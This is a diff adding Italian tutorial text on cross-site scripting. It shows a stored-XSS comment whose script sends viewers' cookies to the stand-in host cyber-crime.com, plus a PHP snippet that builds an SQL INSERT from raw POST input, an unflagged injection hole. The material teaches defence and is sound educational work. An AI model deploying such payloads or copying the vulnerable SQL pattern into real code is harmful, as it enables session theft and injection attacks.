@@ -27,8 +27,46 @@ La pagina restituita diventa:
 ```html
 Benvenuto, <script>document.cookie</script>
 ```
-forzando il server a generare una pagina di risposta con del codice javascript arbitrario.
+forzando il server a generare una pagina di risposta con del codice javascript arbitrario, che viene eseguito nel browser dell'utente che la riceve.
 
+In particolare, document.cookie è un oggetto JavaScript che contiene tutti i cookie accessibili della pagina corrente. Per esempio potrebbe contenere:
+"sessionId=abc123; userId=456; theme=dark"
+
+#### Esempio di Vulnerabilità XSS
+In realtà questo attacco in particolare non è particolarmente pericoloso, perchè la pagina con il codice "iniettato" viene restituita all'utente che ha effettuato l'attacco. Sarebbe come attaccare se stessi.
+Ma consideriamo questo scenario.
+Supponiamo di avere un Instagram senza protezione verso XSS.
+L'utente CyberCrime commenta il post Instagram dell'utente Tanos con la seguente stringa:
+```html
+Bel post! <script>fetch('https://cyber-crime.com/upload?' + document.cookie);</script>
+```
+La funzione fetch() esegue una richiesta HTTP GET all'URL passato come parametro.
+
+Il commento, così come scritto dall'utente CyberCrime, arriva al server, che lo salverà su database, come qualunque altro commento.
+
+```php
+<?php
+$sql = "INSERT INTO comments (text) VALUES ('" . $_POST['comment'] . "')";
+//ecc...
+?>
+```
+
+Supponiamo che la pagina Instagram di Tanos viene visualizzata dall'utente Tony. Il server prepara dinamicamente la pagina Instagram di Tanos, mostrando tutti commenti del post (caricandoli dal database). Tony quindi riceverà sul suo browser una pagina html del tipo:
+```html
+-= Tanos =-
+Il multiverso è una teoria interessante.
+---Commenti---
+CyberCrime: Bel post!
+<script>fetch('https://cyber-crime.com/upload?' + document.cookie);</script>
+--------------
+```
+Il browser di Tony eseguirà il codice Javascript, caricando i cookie di Tony sul sito dell'utente CyberCrime.
+
+Come per Tony, CyberCrime riceverà i cookie di tutti gli utenti che accedono alla pagina Instagram di Tanos.
+
+Questo esempio mostra come **i cookie non sono adeguati per memorizzare dati sensibili**.
+
+#### Protezione da Cross-Site Scripting (XSS)
 Per prevenire un attacco del genere, sul server va utilizzato htmlspecialchars():
 
 ```php
